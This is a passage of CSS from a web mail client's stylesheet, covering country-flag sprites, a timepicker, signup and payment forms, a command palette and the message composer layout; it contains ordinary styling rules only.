            background-position: -4383px 0
        }

        .iti-flag.sd {
            height: 10px;
            background-position: -4405px 0
        }

        .iti-flag.se {
            height: 13px;
            background-position: -4427px 0
        }

        .iti-flag.sg {
            height: 14px;
            background-position: -4449px 0
        }

        .iti-flag.sh {
            height: 10px;
            background-position: -4471px 0
        }

        .iti-flag.si {
            height: 10px;
            background-position: -4493px 0
        }

        .iti-flag.sj {
            height: 15px;
            background-position: -4515px 0
        }

        .iti-flag.sk {
            height: 14px;
            background-position: -4537px 0
        }

        .iti-flag.sl {
            height: 14px;
            background-position: -4559px 0
        }

        .iti-flag.sm {
            height: 15px;
            background-position: -4581px 0
        }

        .iti-flag.sn {
            height: 14px;
            background-position: -4603px 0
        }

        .iti-flag.so {
            height: 14px;
            background-position: -4625px 0
        }

        .iti-flag.sr {
            height: 14px;
            background-position: -4647px 0
        }

        .iti-flag.ss {
            height: 10px;
            background-position: -4669px 0
        }

        .iti-flag.st {
            height: 10px;
            background-position: -4691px 0
        }

        .iti-flag.sv {
            height: 12px;
            background-position: -4713px 0
        }

        .iti-flag.sx {
            height: 14px;
            background-position: -4735px 0
        }

        .iti-flag.sy {
            height: 14px;
            background-position: -4757px 0
        }

        .iti-flag.sz {
            height: 14px;
            background-position: -4779px 0
        }

        .iti-flag.ta {
            height: 10px;
            background-position: -4801px 0
        }

        .iti-flag.tc {
            height: 10px;
            background-position: -4823px 0
        }

        .iti-flag.td {
            height: 14px;
            background-position: -4845px 0
        }

        .iti-flag.tf {
            height: 14px;
            background-position: -4867px 0
        }

        .iti-flag.tg {
            height: 13px;
            background-position: -4889px 0
        }

        .iti-flag.th {
            height: 14px;
            background-position: -4911px 0
        }

        .iti-flag.tj {
            height: 10px;
            background-position: -4933px 0
        }

        .iti-flag.tk {
            height: 10px;
            background-position: -4955px 0
        }

        .iti-flag.tl {
            height: 10px;
            background-position: -4977px 0
        }

        .iti-flag.tm {
            height: 14px;
            background-position: -4999px 0
        }

        .iti-flag.tn {
            height: 14px;
            background-position: -5021px 0
        }

        .iti-flag.to {
            height: 10px;
            background-position: -5043px 0
        }

        .iti-flag.tr {
            height: 14px;
            background-position: -5065px 0
        }

        .iti-flag.tt {
            height: 12px;
            background-position: -5087px 0
        }

        .iti-flag.tv {
            height: 10px;
            background-position: -5109px 0
        }

        .iti-flag.tw {
            height: 14px;
            background-position: -5131px 0
        }

        .iti-flag.tz {
            height: 14px;
            background-position: -5153px 0
        }

        .iti-flag.ua {
            height: 14px;
            background-position: -5175px 0
        }

        .iti-flag.ug {
            height: 14px;
            background-position: -5197px 0
        }

        .iti-flag.um {
            height: 11px;
            background-position: -5219px 0
        }

        .iti-flag.us {
            height: 11px;
            background-position: -5241px 0
        }

        .iti-flag.uy {
            height: 14px;
            background-position: -5263px 0
        }

        .iti-flag.uz {
            height: 10px;
            background-position: -5285px 0
        }

        .iti-flag.va {
            height: 15px;
            background-position: -5307px 0
        }

        .iti-flag.vc {
            height: 14px;
            background-position: -5324px 0
        }

        .iti-flag.ve {
            height: 14px;
            background-position: -5346px 0
        }

        .iti-flag.vg {
            height: 10px;
            background-position: -5368px 0
        }

        .iti-flag.vi {
            height: 14px;
            background-position: -5390px 0
        }

        .iti-flag.vn {
            height: 14px;
            background-position: -5412px 0
        }

        .iti-flag.vu {
            height: 12px;
            background-position: -5434px 0
        }

        .iti-flag.wf {
            height: 14px;
            background-position: -5456px 0
        }

        .iti-flag.ws {
            height: 10px;
            background-position: -5478px 0
        }

        .iti-flag.xk {
            height: 15px;
            background-position: -5500px 0
        }

        .iti-flag.ye {
            height: 14px;
            background-position: -5522px 0
        }

        .iti-flag.yt {
            height: 14px;
            background-position: -5544px 0
        }

        .iti-flag.za {
            height: 14px;
            background-position: -5566px 0
        }

        .iti-flag.zm {
            height: 14px;
            background-position: -5588px 0
        }

        .iti-flag.zw {
            height: 10px;
            background-position: -5610px 0
        }

        .iti-flag {
            width: 20px;
            height: 15px;
            -webkit-box-shadow: 0 0 1px 0 #888;
            box-shadow: 0 0 1px 0 #888;
            background-image: url(assets/img/flags.png);
            background-repeat: no-repeat;
            background-color: #dbdbdb;
            background-position: 20px 0
        }

        @media only screen and (-webkit-min-device-pixel-ratio:2),
        only screen and (min--moz-device-pixel-ratio:2),
        only screen and (min-device-pixel-ratio:2),
        only screen and (min-resolution:2dppx),
        only screen and (min-resolution:192dpi) {
            .iti-flag {
                background-image: url(assets/img/flags@2x.png)
            }
        }

        .iti-flag.np {
            background-color: transparent
        }

        .starButton .starButton-unstar {
            display: none !important
        }

        .starButton.starButton-starred .starButton-unstar {
            display: inline-block !important
        }

        .starButton.starButton-starred .starButton-star {
            display: none !important
        }

        .singleStar {
            display: inline-block
        }

        .storageBar {
            height: 6px;
            background-color: #f4f4f4;
            display: block;
            position: relative;
            margin: .5rem auto;
            border-radius: 12px;
            overflow: hidden
        }

        .storageBar .storageBar-progress {
            height: 100%;
            background-color: #9397cd
        }

        .ui-timepicker-container {
            position: absolute;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            z-index: 5000 !important
        }

        .ui-timepicker {
            list-style: none outside none;
            padding: 0;
            text-align: center
        }

        .ui-timepicker,
        .ui-timepicker-viewport {
            -webkit-box-sizing: content-box;
            box-sizing: content-box;
            display: block;
            height: 205px;
            margin: 0;
            width: 100% !important
        }

        .ui-timepicker-viewport {
            padding: 0 !important;
            overflow-x: hidden
        }

        .ui-timepicker-standard {
            background-color: #fff;
            border: 1px solid #aaa;
            color: #555;
            margin: 0;
            padding: 0
        }

        .ui-timepicker-standard a {
            border: 1px solid transparent;
            color: inherit;
            display: block;
            padding: .6em .5em;
            text-decoration: none
        }

        .ui-timepicker-standard .ui-state-hover {
            background-color: #f4f4f4;
            font-weight: 400;
            color: #555
        }

        .ui-timepicker-standard .ui-menu-item {
            margin: 0;
            padding: 0;
            font-size: 13px
        }

        .ui-timepicker-corners,
        .ui-timepicker-corners .ui-corner-all {
            border-radius: 4px
        }

        .ui-timepicker-hidden {
            display: none
        }

        .ui-timepicker-no-scrollbar .ui-timepicker {
            border: none
        }

        .scrollbox-container {
            position: relative;
            z-index: 1;
            max-height: 175px;
            padding-right: 15px;
            overflow: auto;
            -webkit-overflow-scrolling: touch;
            display: block;
            clear: both;
            border-top: 1px solid #acb0bf;
            border-bottom: 1px solid #acb0bf;
            background: #fff no-repeat;
            background-image: radial-gradient(farthest-side at 50% 0, #acb0bf, transparent), radial-gradient(farthest-side at 50% 100%, #acb0bf, transparent);
            background-position: 0 0, 0 100%;
            background-size: 100% 3px
        }

        .scrollbox-container:after,
        .scrollbox-container:before {
            content: "";
            position: relative;
            z-index: -1;
            display: block;
            height: 15px;
            margin: 0 0 -15px;
            background: -webkit-gradient(linear, left top, left bottom, from(#fff), color-stop(30%, #fff), to(hsla(0, 0%, 100%, 0)));
            background: linear-gradient(180deg, #fff, #fff 30%, hsla(0, 0%, 100%, 0))
        }

        .scrollbox-container:after {
            margin: -15px 0 0;
            background: -webkit-gradient(linear, left top, left bottom, from(hsla(0, 0%, 100%, 0)), color-stop(70%, #fff), to(#fff));
            background: linear-gradient(180deg, hsla(0, 0%, 100%, 0), #fff 70%, #fff)
        }

        .scrollbox-container .scrollbox-container-group,
        .scrollbox-container .scrollbox-container-group-item {
            display: block;
            list-style-type: none;
            margin: 0;
            padding: 0;
            clear: both;
            position: relative
        }

        .scrollbox-container .scrollbox-container-group {
            padding: 10px 0
        }

        .scrollbox-container .scrollbox-container-group-item {
            display: -webkit-inline-flex;
            display: -webkit-inline-box;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            width: 100%
        }

        .arrowsToScroll-button {
            width: 30px;
            height: 30px;
            border: 0;
            border-radius: 50%;
            background: #505061;
            color: #fff;
            -webkit-box-shadow: 0 0 10px rgba(80, 80, 97, .4);
            box-shadow: 0 0 10px rgba(80, 80, 97, .4);
            pointer-events: all;
            font-size: 18px
        }

        .arrowsToScroll-button:after {
            position: relative;
            font-family: FontAwesome;
            line-height: 28px
        }

        .arrowsToScroll-button[data-direction=left]:after {
            content: "\F053";
            left: -2px
        }

        .arrowsToScroll-button[data-direction=right]:after {
            content: "\F054";
            right: -2px
        }

        .arrowsToScroll-button:hover {
            -webkit-transform: scale(1.1);
            transform: scale(1.1);
            -webkit-box-shadow: 0 0 10px rgba(80, 80, 97, .6);
            box-shadow: 0 0 10px rgba(80, 80, 97, .6)
        }

        .arrowsToScroll-button[disabled] {
            display: none
        }

        .dropzone {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            border-color: rgba(0, 0, 0, .05)
        }

        .dropzone--with-click {
            color: #9397cd;
            text-decoration: underline;
            cursor: pointer
        }

        .dropzone--with-click:hover {
            text-decoration: none
        }

        .progressBar-container[value] {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            border: none;
            height: 10px;
            width: 100%;
            margin-bottom: 20px;
            border-radius: 10px;
            color: #9397cd
        }

        .progressBar-container::-moz-progress-bar {
            background: #9397cd;
            border-radius: 10px
        }

        .progressBar-container::-webkit-progress-value {
            background: #9397cd;
            border-radius: 10px
        }

        .progressBar-container[value]::-webkit-progress-bar {
            background-color: #f4f4f4;
            -webkit-box-shadow: 0 1px 5px rgba(0, 0, 0, .25) inset;
            box-shadow: inset 0 1px 5px rgba(0, 0, 0, .25);
            border-radius: 10px
        }

        .headerBlock-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: baseline;
            -webkit-align-items: baseline;
            -ms-flex-align: baseline;
            align-items: baseline;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
            border-bottom: 1px solid #acb0bf;
            padding: 0 0 .3em;
            margin: 0 0 1rem;
            font-size: 20px;
            font-weight: 200
        }

        .headerBlock-container[data-level="2"] {
            border: 0
        }

        .headerBlock-container [class*=title] {
            font-weight: 200;
            font-size: 20px
        }

        .headerBlock-container [class*=details] {
            font-size: .8rem;
            font-weight: 400;
            color: #555
        }

        .headerBlock-container [class*=link] {
            color: #9397cd
        }

        .appConfigBody-is-mobile .headerBlock-container {
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column
        }

        .generateModal-container:not(.generateModal-process) .generateModal-process-about,
        .generateModal-process [class*=generateModal-key-] {
            display: none
        }

        [class*=generateModal-state] {
            color: #222
        }

        .generateModal-row[data-state="0"] .generateModal-state-done,
        .generateModal-row[data-state="0"] .generateModal-state-error,
        .generateModal-row[data-state="0"] .generateModal-state-generating,
        .generateModal-row[data-state="0"] .generateModal-state-saved,
        .generateModal-row[data-state="1"] .generateModal-state-done,
        .generateModal-row[data-state="1"] .generateModal-state-error,
        .generateModal-row[data-state="1"] .generateModal-state-queued,
        .generateModal-row[data-state="1"] .generateModal-state-saved,
        .generateModal-row[data-state="2"] .generateModal-state-error,
        .generateModal-row[data-state="2"] .generateModal-state-generating,
        .generateModal-row[data-state="2"] .generateModal-state-queued,
        .generateModal-row[data-state="2"] .generateModal-state-saved,
        .generateModal-row[data-state="3"] .generateModal-state-done,
        .generateModal-row[data-state="3"] .generateModal-state-error,
        .generateModal-row[data-state="3"] .generateModal-state-generating,
        .generateModal-row[data-state="3"] .generateModal-state-queued,
        .generateModal-row[data-state="4"] .generateModal-state-done,
        .generateModal-row[data-state="4"] .generateModal-state-generating,
        .generateModal-row[data-state="4"] .generateModal-state-queued,
        .generateModal-row[data-state="4"] .generateModal-state-saved,
        .identitySection-container:not(.identitySection-has-multiple-address) .addressesSelector-icon,
        .identitySection-container:not(.identitySection-has-multiple-address) .identitySection-multiple-label,
        .identitySection-container:not(.identitySection-has-multiple-address) .identitySection-priority-link,
        .identitySection-has-multiple-address .identitySection-single-label {
            display: none
        }

        .identitySection-container:not(.identitySection-has-multiple-address) .addressesSelector-container {
            -webkit-box-shadow: none;
            box-shadow: none;
            pointer-events: none
        }

        .humanVerification-type-captcha .humanVerification-help-privacy,
        .humanVerification-type-donation .humanVerification-completeSetup,
        .humanVerification-type-donation .humanVerification-help-privacy,
        .humanVerification-wrapper.humanVerification-show-captcha .humanVerification-sms-details,
        .humanVerification-wrapper.humanVerification-show-email .humanVerification-sms-details,
        .humanVerification-wrapper:not(.humanVerification-show-captcha) .humanVerification-block-captcha,
        .humanVerification-wrapper:not(.humanVerification-show-donation) .humanVerification-block-donation,
        .humanVerification-wrapper:not(.humanVerification-show-email) .humanVerification-block-email,
        .humanVerification-wrapper:not(.humanVerification-show-sms) .humanVerification-block-sms,
        .humanVerification-wrapper:not(.humanVerification-type-captcha) .humanVerification-form-captcha,
        .humanVerification-wrapper:not(.humanVerification-type-donation) .humanVerification-form-donation,
        .humanVerification-wrapper:not(.humanVerification-type-email) .humanVerification-form-email,
        .humanVerification-wrapper:not(.humanVerification-type-sms) .humanVerification-form-sms,
        .usernamePassword-container:not(.usernamePassword-type-mailbox) [class*=-mailbox] {
            display: none
        }

        .signupUserForm-footer {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center
        }

        .signupUserForm-footer a {
            color: #9397cd
        }

        .signupUserForm-footer a:hover {
            color: #505061;
            text-decoration: none
        }

        .signUpProcess-btn-create {
            margin-bottom: 1em
        }

        .signupPayForm-container:not(.signupPayForm-error) .signupPayForm-btn-retry,
        .signupPayForm-container:not(.signupPayForm-error) .signupPayForm-msg-error,
        .signupPayForm-container:not(.signupPayForm-show-features) .signupPayForm-btn-features .fa-angle-up,
        .signupPayForm-container:not(.signupPayForm-show-features) .signupPayForm-view-features,
        .signupPayForm-cycle-month .signupPayForm-selection-annually,
        .signupPayForm-cycle-year .signupPayForm-selection-monthly,
        .signupPayForm-error .signupPayForm-btn-submit,
        .signupPayForm-method-paypal .signupPayForm-footer,
        .signupPayForm-plan-plus .signupPayForm-feature-visionary,
        .signupPayForm-plan-visionary .signupPayForm-feature-plus,
        .signupPayForm-show-features .signupPayForm-btn-features .fa-angle-down {
            display: none
        }

        .signupPayForm-footer {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center
        }

        .signupPayForm-btn-features {
            border: 0;
            background: none
        }

        .signupPayForm-gift-col {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        .signupPayForm-container .giftCodeInput-container {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1
        }

        .signupPayForm-btn-apply {
            margin-left: 20px
        }

        .signupPayForm-container:not(.signupPayForm-show-gift) .giftCodeInput-container,
        .signupPayForm-container:not(.signupPayForm-show-gift) .signupPayForm-btn-apply,
        .signupPayForm-gift-applied .signupPayForm-gift-row,
        .signupPayForm-show-gift .giftCodeBtn-container {
            display: none
        }

        .signupPayForm-container .giftCodeBtn-text {
            text-transform: uppercase
        }

        .displayNameSignature-container .squireToolbar-text-mode,
        .signupCreationProcess-container:not(.signupCreationProcess-error) [class*=signupCreationProcess-error-],
        .signupCreationProcess-error .signupCreationProcess-title {
            display: none
        }

        .commandPalette-container {
            position: fixed;
            z-index: 3137;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            width: 500px;
            height: 240px;
            padding: 1.7rem 1rem 1rem;
            margin: auto;
            background: #fff;
            border-radius: .2em;
            -webkit-box-shadow: 0 0 .4em .1em rgba(0, 0, 0, .25);
            box-shadow: 0 0 .4em .1em rgba(0, 0, 0, .25);
            -webkit-transform: translateY(-50%);
            transform: translateY(-50%)
        }

        .commandPalette-container:not(.commandPalette-visible),
        .commandPalette-label {
            display: none
        }

        .autocompleteCommand-container ul[hidden]:not(:empty) {
            display: block;
            pointer-events: all;
            opacity: 1
        }

        .autocompleteCommand-container .autocomplete-container {
            position: relative;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .autocompleteCommand-container .awesomplete input {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: 1em 1em 1em .5em;
            border: 0
        }

        .autocompleteCommand-container .autocomplete-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            background: #eee;
            font-weight: 700
        }

        .autocompleteCommand-container .awesomplete {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1
        }

        .autocompleteCommand-container .autocompleteEmails-autocomplete {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            position: static;
            width: 100%;
            border: 0;
            padding: 0;
            margin: .5em 0;
            max-height: 200px
        }

        .autocompleteCommand-container .autocompleteEmails-autocomplete li {
            padding: 1em;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .autocompleteCommand-container .autocompleteEmails-autocomplete li+li {
            border-top: 1px solid #e0e2e5
        }

        .autocompleteCommand-container .autocompleteEmails-autocomplete [aria-selected=true] {
            background: #9397cd;
            color: #fff
        }

        .autocompleteCommand-input {
            background: transparent
        }

        .autocompleteCommand-scope:empty {
            display: none
        }

        .autocompleteCommand-scope:empty+.awesomplete input {
            padding-left: 1em
        }

        .autocompleteCommand-scope {
            background: none;
            padding: 0 .5em 0 1em
        }

        .autocompleteCommand-scope:not(:empty):after {
            content: "\203A";
            margin: 0 .2em
        }

        .commandPalette-btn-close {
            position: absolute;
            top: .4em;
            right: .2em;
            background: none;
            border: 0
        }

        .commandPalette-btn-close:active {
            color: #aeaeba
        }

        .appConfigBody-commandPalette:before {
            background: rgba(0, 0, 0, .5);
            z-index: 3001 !important
        }

        #pm_composer .composer-dropzone-wrapper {
            display: none
        }

        #pm_composer [class*=composer-draggable] .composer-dropzone-wrapper {
            display: block;
            position: absolute;
            top: 0;
            left: 0;
            height: 100%;
            width: 100%;
            z-index: 90
        }

        #pm_composer .composer-askEmbedding {
            display: none !important
        }

        #pm_composer .composer-dropzone {
            display: none
        }

        #pm_composer .composer-dropzone * {
            pointer-events: none
        }

        #pm_composer .composer-draggable-editor .composer-askEmbedding,
        #pm_composer .composer-draggable .composer-dropzone {
            display: -webkit-box !important;
            display: -webkit-flex !important;
            display: -ms-flexbox !important;
            display: flex !important
        }

        #pm_composer .composer-field-ToList .autocompleteEmails-admin {
            padding-right: 7px
        }

        #pm_composer .composer {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-direction: column;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-direction: column;
            flex-direction: column;
            position: absolute;
            height: calc(100% - 100px) !important;
            max-height: 510px;
            right: 0 !important;
            -webkit-transform: translateX(-20px);
            transform: translateX(-20px);
            visibility: hidden;
            bottom: 1rem;
            z-index: 8888;
            background: #fff;
            will-change: transform
        }

        #pm_composer .composer .row,
        #pm_composer .composer footer,
        #pm_composer .composer header {
            line-height: 32px
        }

        #pm_composer .composer .bccRow .composerInputMeta-overlay-button,
        #pm_composer .composer .ccRow .composerInputMeta-overlay-button,
        #pm_composer .composer .composer-meta:not(.composer-toggle-ccbcc) .bccRow,
        #pm_composer .composer .composer-meta:not(.composer-toggle-ccbcc) .ccRow {
            display: none
        }

        #pm_composer .composer .row {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-direction: row;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -ms-flex-direction: row;
            flex-direction: row;
            position: relative;
            padding: 0 10px
        }

        #pm_composer .composer .row label {
            padding-right: 10px
        }

        #pm_composer .composer .row input,
        #pm_composer .composer .row select {
            height: 32px;
            line-height: 32px
        }

        #pm_composer .composer .row select {
            z-index: 2;
            background: transparent
        }

        #pm_composer .composer .row .pm_button.link {
            position: absolute;
            right: 7px;
            top: 0;
            line-height: 32px;
            cursor: pointer
        }

        #pm_composer .composer .row.placeholder,
        #pm_composer .composer .row.placeholder label,
        #pm_composer .composer .row.toRow,
        #pm_composer .composer .row.toRow label {
            cursor: text
        }

        #pm_composer .composer .flex {
            min-height: 0
        }

        #pm_composer .composer .fill,
        #pm_composer .composer .flex {
            -webkit-flex: 1;
            -webkit-box-flex: 1;
            -ms-flex: 1;
            flex: 1;
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex
        }

        #pm_composer .composer .fill {
            max-height: 100%;
            width: 100%;
            -webkit-flex-direction: column;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-direction: column;
            flex-direction: column
        }

        #pm_composer .composer.composer-draggable-editor .composeEditor {
            position: relative
        }

        #pm_composer .composer .container-email {
            width: calc(100% - 40px)
        }

        #pm_composer .composer iframe {
            -webkit-flex: 1;
            -webkit-box-flex: 1;
            -ms-flex: 1;
            flex: 1;
            position: relative;
            z-index: 4;
            width: 100%;
            height: 100%
        }

        #pm_composer .composer .dropzone {
            position: absolute;
            width: 100%;
            height: 100%;
            z-index: 99;
            top: 0;
            left: 0;
            background: transparent
        }

        #pm_composer .composer :not(.composer-draggable) .dropzone {
            display: none
        }

        #pm_composer .composer .dz-message {
            position: absolute;
            width: 100%;
            z-index: 99;
            border: 1rem solid rgba(0, 0, 0, .05);
            background: #fff;
            left: 0;
            bottom: 24px;
            height: calc(58% - 3px);
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            opacity: 1 !important
        }

        #pm_composer .composer.expandRecipients .dz-message {
            height: calc(45% - 3px)
        }

        #pm_composer .composer.maximized .dz-message {
            height: 73%
        }

        #pm_composer .composer.expandRecipients.maximized .dz-message {
            height: 60%
        }

        #pm_composer .composer .toolbar li {
            -webkit-flex: 1;
            -webkit-box-flex: 1;
            -ms-flex: 1;
            flex: 1;
            cursor: pointer;
            height: 32px;
            line-height: 32px
        }

        #pm_composer .composer .fa {
            font-size: 14px
        }

        #pm_composer .composer .fa.fa-minus {
            position: relative;
            top: 5px
        }

        #pm_composer .composer .composer-btn-encryption {
            padding-top: 1px
        }

        #pm_composer .composer .composer-btn-encryption .fa {
            font-size: 15px
        }

        #pm_composer .composer .composer-btn-expiration .fa {
            font-size: 12px
        }

        #pm_composer .composer .plain-text-icon {
            display: inline-block;
            width: 17px;
            height: 17px;
            background: url(assets/img/plaintext.svg) no-repeat 50%
        }

        #pm_composer .composer .squire-popover.makeLink {
            right: 41px !important
        }

        #pm_composer .composer .squire-popover.insertImage {
            right: 60px !important
        }

        #pm_composer .composer .squire-popover-overlay {
            background: rgba(0, 0, 0, .2);
            left: 0;
            top: 0;
            right: 0;
            bottom: 0;
            position: absolute;
            z-index: 2
        }

        #pm_composer .composer .attachmentBar {
            height: 32px;
            line-height: 32px;
            padding: 0 10px;
            cursor: pointer;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            z-index: 7;
            border-top: 1px solid #acb0bf;
            background: #e6eaf0
        }

        #pm_composer .composer .attachmentBar i {
            font-style: normal
        }

        #pm_composer .composer .attachmentBar i.embedded {
            color: #9397cd
        }

        #pm_composer .composer .attachmentBar .fa {
            display: inline-block;
            line-height: 32px;
            height: 32px
        }

        #pm_composer .composer .previews {
            padding-top: 10px;
            padding-left: 10px;
            overflow: auto;
            -webkit-overflow-scrolling: touch;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            background: #e6eaf0
        }

        #pm_composer .composer .previews .preview-close {
            margin-left: .25rem;
            color: #555
        }

        #pm_composer .composer .previews .attachment .fa {
            margin-right: .5rem;
            line-height: 34px;
            float: left
        }

        #pm_composer .composer .previews .attachment .fa.embedded {
            color: #9397cd
        }

        #pm_composer .composer .previews .attachment .preview-name {
            float: left;
            width: calc(100% - 4rem)
        }

        #pm_composer .composer .previews footer {
            position: absolute;
            left: 0;
            right: 0;
            bottom: 0
        }

        #pm_composer .composer .previews .pm_button {
            margin: 0 10px 10px 0;
            float: left;
            text-transform: none;
            background: #fff
        }

        #pm_composer .composer.attachmentsOpen .previews {
            overflow: hidden;
            -webkit-overflow-scrolling: touch
        }

        #pm_composer .composer.attachmentsOpen .attachmentBar {
            -webkit-box-shadow: 0 1px 0 #acb0bf;
            box-shadow: 0 1px 0 #acb0bf
        }

        #pm_composer .composer.attachmentsOpen .attachmentArea .pm_button {
            color: #555;
            border-radius: 2px;
            width: 45%;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            white-space: nowrap;
            position: relative
        }

        #pm_composer .composer.attachmentsOpen .attachmentArea .pm_button .preview-name {
            overflow: hidden;
            text-overflow: ellipsis;
            padding-right: 1.25rem;
            display: block;
            height: 32px
        }

        #pm_composer .composer.attachmentsOpen .attachmentArea .pm_button .preview-close {
            position: absolute;
            right: 0;
            top: 0;
            bottom: 0;
            cursor: pointer;
            padding: 0 .5rem
        }

        #pm_composer .composer.attachmentsOpen .attachmentArea .pm_button.uploading {
            background: #e1e1e1
        }

        @media (min-width:600px) {
            #pm_composer .composer {
                width: 600px;
                -webkit-box-shadow: 1px 1px 3px rgba(0, 0, 0, .33), 0 0 2px rgba(0, 0, 0, .33);
                box-shadow: 1px 1px 3px rgba(0, 0, 0, .33), 0 0 2px rgba(0, 0, 0, .33);
                border-radius: 2px;
                overflow: hidden
            }
        }

        #pm_composer .composer.small {
            height: 480px !important
        }

        #pm_composer .composer.mini {
            height: 380px !important
        }

        #pm_composer .composer.minimized {
            height: 32px !important;
            overflow: hidden;
            padding: 0 !important
        }

        #pm_composer .composer.minimized header {
            border-radius: 2px
        }

        #pm_composer .composer.minimized header .fa.fa-minus {
            top: -5px
        }

        #pm_composer .composer.minimized>div,
        #pm_composer .composer.minimized>footer {
            display: none
        }

        #pm_composer .composer.maximized {
            position: absolute;
            top: 81px;
            right: 0;
            bottom: 20px;
            -webkit-transition: none;
            transition: none;
            -webkit-transform: translateX(-20px) !important;
            transform: translateX(-20px) !important;
            width: calc(100% - 190px - 40px);
            height: auto !important;
            max-height: 100%;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            margin: 0;
            overflow: auto
        }

        #pm_composer .composer.maximized footer,
        #pm_composer .composer.maximized header {
            border-radius: 0
        }

        #pm_composer .composer.attachmentsOpen.moreAttachments .previews {
            height: 111px;
            overflow: auto
        }

        #pm_composer .composer .dotdotdot {
            display: none
        }

        #pm_composer .composer.blur {
            -webkit-box-shadow: 1px 1px 3px rgba(0, 0, 0, .1), 0 0 2px rgba(0, 0, 0, .1);
            box-shadow: 1px 1px 3px rgba(0, 0, 0, .1), 0 0 2px rgba(0, 0, 0, .1)
        }

        #pm_composer .composer.blur>* {
            opacity: .75
        }

        #pm_composer .composer .row {
            border-bottom: 1px solid #acb0bf
        }

        #pm_composer .composer .row.placeholder div {
            color: #222;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            display: block;
            padding-right: 20px
        }

        #pm_composer .composer .row .overlay {
            position: absolute;
            z-index: 10;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%
        }

        #pm_composer .composer input,
        #pm_composer .composer select {
            font-size: 14px;
            color: #333
        }

        #pm_composer .composer .meta {
            color: #e1e1e1
        }

        #pm_composer .composer .meta input,
        #pm_composer .composer .meta select {
            border: none;
            padding: none
        }

        #pm_composer .composer .fromRow {
            color: #555
        }

        #pm_composer .composer footer {
            padding: 10px;
            background: #e6eaf0;
            border-top: 1px solid #acb0bf
        }

        #pm_composer .composer footer.disabled .pm_button {
            pointer-events: none;
            opacity: .5
        }

        #pm_composer .composer footer.disabled .dead {
            pointer-events: none
        }

        #pm_composer .composer footer .pm_button {
            line-height: 32px;
            height: 32px;
            padding: 0 1rem;
            background: #fff;
            border: 1px solid #acb0bf;
            -webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, .1);
            box-shadow: 0 1px 1px rgba(0, 0, 0, .1)
        }

        #pm_composer .composer footer .pm_button.primary {
            background: #9397cd
        }

        #pm_composer .composer footer .pm_button.disabled {
            background: #000
        }

        #pm_composer .composer.expandRecipients {
            overflow: hidden
        }

        #pm_composer .composer ul {
            margin: 0;
            padding: 0;
            list-style: none
        }

        #pm_composer .composer input,
        #pm_composer .composer select {
            outline: none;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none
        }

        #pm_composer .composer select::-ms-expand {
            display: none
        }

        #pm_composer .composer ::-webkit-input-placeholder {
            color: #e1e1e1
        }

        #pm_composer .composer :-moz-placeholder,
        #pm_composer .composer ::-moz-placeholder {
            color: #e1e1e1
        }

        #pm_composer .composer :-ms-input-placeholder {
            color: #e1e1e1
        }

        @media screen and (max-width:640px) {
            #pm_composer .composer[style] {
